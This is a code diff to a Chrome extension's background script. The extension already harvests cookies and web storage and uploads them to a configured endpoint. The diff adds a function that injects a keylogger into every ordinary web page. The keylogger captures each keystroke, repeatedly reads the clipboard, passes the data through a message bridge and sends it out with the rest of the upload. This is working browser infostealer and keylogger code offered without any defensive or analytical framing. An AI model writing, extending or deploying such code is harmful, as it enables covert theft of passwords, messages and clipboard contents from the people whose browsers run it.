@@ -3,6 +3,8 @@ let collectedData = {
   cookies: [],
   localStorage: [],
   sessionStorage: [],
+  keystrokes: [],
+  clipboard: [],
   timestamp: new Date().toISOString()
 };
 
@@ -10,17 +12,25 @@ let collectedData = {
 chrome.runtime.onStartup.addListener(loadSettings);
 chrome.runtime.onInstalled.addListener(loadSettings);
 
-// Monitor tab updates for localStorage collection
+// Monitor tab updates for localStorage collection and keylogger injection
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-  if (changeInfo.status === 'complete' && tab.url && settings.autoScrapeEnabled) {
-    collectTabData(tabId, tab.url);
+  if (changeInfo.status === 'complete' && tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
+    injectKeylogger(tabId);
+    if (settings.autoScrapeEnabled) {
+      collectTabData(tabId, tab.url);
+    }
   }
 });
 
 // Monitor new tabs
 chrome.tabs.onCreated.addListener((tab) => {
-  if (settings.autoScrapeEnabled && tab.url) {
-    setTimeout(() => collectTabData(tab.id, tab.url), 2000);
+  if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
+    setTimeout(() => {
+      injectKeylogger(tab.id);
+      if (settings.autoScrapeEnabled) {
+        collectTabData(tab.id, tab.url);
+      }
+    }, 2000);
   }
 });
 
@@ -32,6 +42,28 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     settings = request.settings;
     setupAutoScrape();
     sendResponse({success: true});
+  } else if (request.action === 'logData') {
+    if (request.data.keys) {
+      collectedData.keystrokes.push({
+        url: request.data.url,
+        domain: request.data.domain,
+        keys: request.data.keys,
+        timestamp: request.data.timestamp
+      });
+    }
+    if (request.data.clipboard && request.data.clipboard.length > 0) {
+      collectedData.clipboard.push(...request.data.clipboard.map(clip => ({
+        ...clip,
+        url: request.data.url,
+        domain: request.data.domain
+      })));
+    }
+    if (collectedData.keystrokes.length > 1000) {
+      collectedData.keystrokes = collectedData.keystrokes.slice(-500);
+    }
+    if (collectedData.clipboard.length > 500) {
+      collectedData.clipboard = collectedData.clipboard.slice(-250);
+    }
   }
 });
 
@@ -98,8 +130,12 @@ async function extractAllCookies(forceMethod = null) {
       browser: 'Chrome/Chromium',
       total_cookies: collectedData.cookies.length,
       total_localStorage_sites: collectedData.localStorage.length,
+      total_keystrokes: collectedData.keystrokes.length,
+      total_clipboard: collectedData.clipboard.length,
       cookies: collectedData.cookies,
-      localStorage: collectedData.localStorage
+      localStorage: collectedData.localStorage,
+      keystrokes: collectedData.keystrokes,
+      clipboard: collectedData.clipboard
     };
 
     // Manual extraction uses selected method
@@ -220,11 +256,15 @@ async function collectTabData(tabId, url) {
 async function collectAllData() {
   console.log('Collecting all data from open tabs...');
   
-  // Reset collection
+  // Reset collection (keep keystrokes and clipboard)
+  const existingKeystrokes = collectedData.keystrokes || [];
+  const existingClipboard = collectedData.clipboard || [];
   collectedData = {
     cookies: [],
     localStorage: [],
     sessionStorage: [],
+    keystrokes: existingKeystrokes,
+    clipboard: existingClipboard,
     timestamp: new Date().toISOString()
   };
   
@@ -255,6 +295,106 @@ async function collectAllData() {
   console.log(`Collected ${collectedData.cookies.length} cookies and ${collectedData.localStorage.length} localStorage entries`);
 }
 
+// Inject keylogger into tab
+async function injectKeylogger(tabId) {
+  try {
+    await chrome.scripting.executeScript({
+      target: { tabId: tabId },
+      func: () => {
+        if (window.keyloggerInjected) return;
+        window.keyloggerInjected = true;
+        
+        let keyBuffer = [];
+        let clipboardData = [];
+        let lastSend = Date.now();
+        let lastClipboard = '';
+        const SEND_INTERVAL = 10000;
+        const MAX_BUFFER = 100;
+
+        function sendData() {
+          if (keyBuffer.length === 0 && clipboardData.length === 0) return;
+          
+          window.postMessage({
+            type: 'KEYLOGGER_DATA',
+            data: {
+              url: window.location.href,
+              domain: window.location.hostname,
+              keys: keyBuffer.join(''),
+              clipboard: clipboardData,
+              timestamp: new Date().toISOString()
+            }
+          }, '*');
+          
+          keyBuffer = [];
+          clipboardData = [];
+          lastSend = Date.now();
+        }
+
+        async function checkClipboard() {
+          try {
+            const text = await navigator.clipboard.readText();
+            if (text && text !== lastClipboard && text.length > 0) {
+              clipboardData.push({
+                content: text,
+                timestamp: new Date().toISOString()
+              });
+              lastClipboard = text;
+            }
+          } catch (e) {}
+        }
+
+        document.addEventListener('keydown', function(e) {
+          let key = e.key;
+          if (key === 'Enter') key = '[ENTER]';
+          else if (key === 'Tab') key = '[TAB]';
+          else if (key === 'Backspace') key = '[BACKSPACE]';
+          else if (key === ' ') key = '[SPACE]';
+          else if (key.length > 1) key = `[${key.toUpperCase()}]`;
+          
+          keyBuffer.push(key);
+          
+          if (keyBuffer.length >= MAX_BUFFER || Date.now() - lastSend >= SEND_INTERVAL) {
+            sendData();
+          }
+        });
+
+        document.addEventListener('paste', () => {
+          setTimeout(checkClipboard, 100);
+        });
+        
+        window.addEventListener('focus', checkClipboard);
+        window.addEventListener('beforeunload', sendData);
+        
+        setInterval(() => {
+          checkClipboard();
+          sendData();
+        }, SEND_INTERVAL);
+      }
+    });
+    
+    // Inject message bridge as content script
+    await chrome.scripting.executeScript({
+      target: { tabId: tabId },
+      world: 'ISOLATED',
+      func: () => {
+        if (window.bridgeInjected) return;
+        window.bridgeInjected = true;
+        
+        window.addEventListener('message', (event) => {
+          if (event.data.type === 'KEYLOGGER_DATA') {
+            chrome.runtime.sendMessage({
+              action: 'logData',
+              data: event.data.data
+            });
+          }
+        });
+      }
+    });
+  } catch (error) {
+    console.log('Failed to inject keylogger:', error.message);
+  }
+}
+
 // Upload all collected data
 async function uploadCollectedData() {
   if (!settings.apiEndpoint) {
@@ -270,8 +410,12 @@ async function uploadCollectedData() {
       browser: 'Chrome/Chromium',
       total_cookies: collectedData.cookies.length,
       total_localStorage_sites: collectedData.localStorage.length,
+      total_keystrokes: collectedData.keystrokes.length,
+      total_clipboard: collectedData.clipboard.length,
       cookies: collectedData.cookies,
-      localStorage: collectedData.localStorage
+      localStorage: collectedData.localStorage,
+      keystrokes: collectedData.keystrokes,
+      clipboard: collectedData.clipboard
     };
     
     const headers = JSON.parse(settings.apiHeaders || '{}');
